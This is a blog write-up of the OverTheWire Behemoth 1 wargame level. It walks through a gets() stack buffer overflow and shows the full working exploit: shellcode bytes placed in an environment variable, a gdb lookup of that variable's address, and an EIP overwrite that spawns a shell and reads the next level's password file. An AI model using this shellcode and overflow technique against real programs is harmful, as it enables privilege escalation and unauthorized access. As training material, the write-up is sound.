---
layout:     post
title:      "Overthewire.org - Behemoth 1 -> 2"
subtitle:   "Write-Up"
date:       2017-04-02 0:00:00
author:     "W3ndige"
header-img: "img/overthewire-header.png"
permalink: /:title/
category: Overthewire
---
<h1>Introduction</h1>

<p>Today we're going to attack another reverse engineering challenge from <b>Behemoth</b> series, to improve our knowledge in reverse engineering.  </p>

<h1>Challenge</h1>

<p>This one seems to behave quite similar as the <b>behemoth0</b> level, but unluckily we can't view the password like in the previous one. Let's dissasemble the binary. </p>

{% highlight asm %}
(gdb) disas main
Dump of assembler code for function main:
   0x0804845d <+0>:	push   %ebp
   0x0804845e <+1>:	mov    %esp,%ebp
   0x08048460 <+3>:	and    $0xfffffff0,%esp
   0x08048463 <+6>:	sub    $0x60,%esp
   0x08048466 <+9>:	movl   $0x8048530,(%esp)
   0x0804846d <+16>:	call   0x8048310 <printf@plt>
   0x08048472 <+21>:	lea    0x1d(%esp),%eax
   0x08048476 <+25>:	mov    %eax,(%esp)
   0x08048479 <+28>:	call   0x8048320 <gets@plt>
   0x0804847e <+33>:	movl   $0x804853c,(%esp)
   0x08048485 <+40>:	call   0x8048330 <puts@plt>
   0x0804848a <+45>:	mov    $0x0,%eax
   0x0804848f <+50>:	leave  
   0x08048490 <+51>:	ret    
End of assembler dump.
{% endhighlight %}

<p>Hmm, we have <b>printf</b>, <b>gets</b> and <b>puts</b> function. We will have to somehow exploit the <b>gets</b> function, by overflowing an buffer and then possibly we will be able to spawn a shell. </p>

{% highlight bash %}
behemoth1@melinda:/behemoth$ python -c 'print "A"*200' | ./behemoth1
Password: Authentication failure.
Sorry.
Segmentation fault
{% endhighlight %}

<p>Great, now we have something to focus on. This time, I wanted to find an offset not by brute forcing (also known as guessing), but by running <b>pattern_offset.rb</b> on the value in <b>EIP</b> - which resulted in number <b>79</b>. But how can we store the shellcode, since nothing is actually stored in the binary?  </p>

<p>In one of the <b>Narnia</b> levels, we used enviromental variable as the way to store the shellcode. </p>

{% highlight bash %}
behemoth1@melinda:/behemoth$ export EGG=$(python -c 'print "\x90"*100+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"')
{% endhighlight %}

<p>Now we can use a tool like <a href="https://github.com/Partyschaum/haxe/blob/master/getenvaddr.c"><b>getenvaddr</b></a> to get the address of the enviromental variable <b>EGG</b>. </p>

{% highlight bash %}
behemoth1@melinda:/tmp$ mkdir muuuuu
behemoth1@melinda:/tmp$ cd muuuuu
behemoth1@melinda:/tmp/muuuuu$
behemoth1@melinda:/tmp/muuuuu$ touch getenvaddr.c
behemoth1@melinda:/tmp/muuuuu$ nano getenvaddr.c
behemoth1@melinda:/tmp/muuuuu$ gcc getenvaddr.c -o getenvaddr
behemoth1@melinda:/tmp/muuuuu$ ./getenvaddr EGG /behemoth/behemoth1
EGG will be at 0x7fffffffe8ac
behemoth1@melinda:/tmp/muuuuu$
{% endhighlight %}

<p>Unluckily it didn't seem to work, so I had to come up with another solution, using <b>gdb</b>. </p>

{% highlight bash %}
behemoth1@melinda:/behemoth$ gdb behemoth1
(gdb) break *0x08048479
Breakpoint 1 at 0x8048479
(gdb) run
Starting program: /games/behemoth/behemoth1

Breakpoint 1, 0x08048479 in main ()
(gdb) x/s *((char **)environ)
0xffffd828:	"XDG_SESSION_ID=478012"
(gdb) x/s *((char **)environ+1)
0xffffd83e:	"SHELL=/bin/bash"
(gdb) x/s *((char **)environ+2)
0xffffd84e:	"TERM=xterm-256color"
(gdb) x/s *((char **)environ+3)
0xffffd862:	"SSH_CLIENT=89.64.16.127 33128 22"
(gdb) x/s *((char **)environ+4)
0xffffd883:	"SSH_TTY=/dev/pts/12"
(gdb) x/s *((char **)environ+5)
0xffffd897:	"LC_ALL=C"
(gdb) x/s *((char **)environ+6)
0xffffd8a0:	"EGG=", '\220' <repeats 100 times>, "\061\333\215C\027\231\315\200\061\311Qhn/shh//bi\215A\v\211\343\315\200"
{% endhighlight %}

<p>Great, now we have to only point the address to our shellcode. </p>

{% highlight bash %}
behemoth1@melinda:/behemoth$  python -c 'print "A"*79+"\xb0\xd8\xff\xff"' | ./behemoth1
Password: Authentication failure.
Sorry.
behemoth1@melinda:/behemoth$ (python -c 'print "A"*79+"\xb0\xd8\xff\xff"';cat) | ./behemoth1
Password: Authentication failure.
Sorry.
whoami
behemoth2
cat /etc/behemoth_pass/behemoth2
*******
{% endhighlight %}

<p>As you may know, the first try didn't work because the shellcode opened the shell without any arguments, resulting in immediate close. Adding <b>cat - </b> allowed us to keep the shell open, and view the password. </p>

<h1>Conclusion</h1>
<p>Fun as always, and very educational. Thanks <a href="http://overthewire.org/wargames/">OverTheWire</a>!</p>
<p>I would also like to point out that if you're thinking about starting journey with CTF challenges <a href="https://picoctf.com/"><b>PicoCTF</b></a> is running now, with a lot of great challenges. Check that out if you're interested!</p>
